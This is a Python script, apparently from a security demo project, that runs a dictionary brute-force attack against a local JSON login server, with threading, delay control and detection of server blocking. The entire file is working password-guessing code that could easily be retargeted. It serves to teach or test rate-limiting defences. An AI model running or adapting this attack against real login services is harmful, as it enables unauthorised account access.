#!/usr/bin/env python3
"""
Brute Force Attack Client
------------------------
Simulates a brute force attack against the secure server.
"""

import socket
import json
import time
import sys
import random
import argparse
from concurrent.futures import ThreadPoolExecutor

# Server information
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9999

# Default attack parameters
DEFAULT_DICTIONARY_FILE = "../utils/password_dictionary.txt"
DEFAULT_TARGET_USERNAME = "admin"
DEFAULT_DELAY = 0.1  # seconds between attempts
DEFAULT_THREADS = 1  # sequential by default

# Attack statistics
attempts = 0
successful = False
password_found = None
start_time = None
blocked = False

def load_passwords(file_path):
    """Load passwords from dictionary file."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"Error loading password file: {str(e)}")
        return []

def attempt_login(username, password):
    """Attempt to login with the given credentials and return the result."""
    global attempts, successful, password_found, blocked
    
    try:
        # Create a socket connection
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(5)  # 5 second timeout
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        
        # Create login request
        request = {
            "username": username,
            "password": password
        }
        
        # Send request to server
        client_socket.sendall(json.dumps(request).encode('utf-8'))
        
        # Get response from server
        response = client_socket.recv(1024).decode('utf-8')
        response_data = json.loads(response)
        
        attempts += 1
        
        # Check if login was successful
        if response_data.get('status') == "success":
            successful = True
            password_found = password
            print(f"\n[+] SUCCESS! Password found: {password}")
            return True
            
        # Check if we got blocked
        if "blocked" in response_data.get('message', '').lower():
            blocked = True
            print(f"\n[!] BLOCKED: {response_data.get('message')}")
            return "blocked"
            
        return False
        
    except ConnectionRefusedError:
        print(f"Error: Could not connect to server at {SERVER_HOST}:{SERVER_PORT}")
        print("Make sure the server is running.")
        return "error"
    except socket.timeout:
        print("Connection timed out. Server might be overloaded.")
        return "error"
    except json.JSONDecodeError:
        print("Error: Received invalid response from server")
        return "error"
    except Exception as e:
        print(f"Error: {str(e)}")
        return "error"
    finally:
        if 'client_socket' in locals():
            client_socket.close()

def print_status():
    """Print current attack status."""
    elapsed = time.time() - start_time
    attempts_per_second = attempts / elapsed if elapsed > 0 else 0
    
    print(f"\r[*] Attempts: {attempts} | "
          f"Elapsed: {elapsed:.1f}s | "
          f"Speed: {attempts_per_second:.1f} attempts/sec", end="")
    sys.stdout.flush()

def attack_sequential(username, passwords, delay=0.1):
    """Perform a sequential brute force attack."""
    global start_time, blocked
    
    print(f"[*] Starting sequential brute force attack on username: {username}")
    print(f"[*] Using dictionary with {len(passwords)} passwords")
    print(f"[*] Delay between attempts: {delay} seconds")
    
    start_time = time.time()
    
    for i, password in enumerate(passwords):
        if successful or blocked:
            break
            
        result = attempt_login(username, password)
        
        if result == "blocked" or result == "error":
            break
        
        if (i + 1) % 10 == 0:
            print_status()
            
        time.sleep(delay)  # Add delay between attempts

def worker(args):
    """Worker function for threaded attack."""
    username, password, delay = args
    global blocked
    
    if successful or blocked:
        return
        
    result = attempt_login(username, password)
    time.sleep(delay)
    
    return result

def attack_threaded(username, passwords, delay=0.1, num_threads=4):
    """Perform a threaded brute force attack."""
    global start_time, blocked
    
    print(f"[*] Starting threaded brute force attack on username: {username}")
    print(f"[*] Using dictionary with {len(passwords)} passwords")
    print(f"[*] Using {num_threads} threads with {delay} seconds delay")
    
    start_time = time.time()
    status_update_time = time.time()
    
    # Prepare worker arguments
    worker_args = [(username, password, delay) for password in passwords]
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for i, _ in enumerate(executor.map(worker, worker_args)):
            # Print status update periodically
            if time.time() - status_update_time > 0.5:  # Update every 0.5 seconds
                print_status()
                status_update_time = time.time()
                
            if successful or blocked:
                executor.shutdown(wait=False)
                break

def main():
    """Main function to parse arguments and start the attack."""
    parser = argparse.ArgumentParser(description="Brute Force Attack Simulator")
    parser.add_argument("-u", "--username", default=DEFAULT_TARGET_USERNAME,
                        help=f"Target username (default: {DEFAULT_TARGET_USERNAME})")
    parser.add_argument("-d", "--dictionary", default=DEFAULT_DICTIONARY_FILE,
                        help=f"Password dictionary file (default: {DEFAULT_DICTIONARY_FILE})")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS,
                        help=f"Number of threads (default: {DEFAULT_THREADS})")
    parser.add_argument("-w", "--wait", type=float, default=DEFAULT_DELAY,
                        help=f"Delay between attempts in seconds (default: {DEFAULT_DELAY})")
    parser.add_argument("-r", "--random", action="store_true",
                        help="Randomize password list order")
    
    args = parser.parse_args()
    
    # Load passwords from dictionary file
    passwords = load_passwords(args.dictionary)
    
    if not passwords:
        print("No passwords loaded. Exiting.")
        return
        
    if args.random:
        print("[*] Randomizing password list")
        random.shuffle(passwords)
    
    # Start the attack
    if args.threads > 1:
        attack_threaded(args.username, passwords, args.wait, args.threads)
    else:
        attack_sequential(args.username, passwords, args.wait)
        
    # Print final statistics
    elapsed = time.time() - start_time
    print("\n\n[*] Attack completed")
    print(f"[*] Attempts: {attempts}")
    print(f"[*] Time elapsed: {elapsed:.2f} seconds")
    print(f"[*] Average speed: {attempts / elapsed:.2f} attempts/second")
    
    if successful:
        print(f"[+] Attack SUCCESSFUL - Found password: {password_found}")
    else:
        print("[-] Attack FAILED - Password not found or blocked by server")

if __name__ == "__main__":
    main()
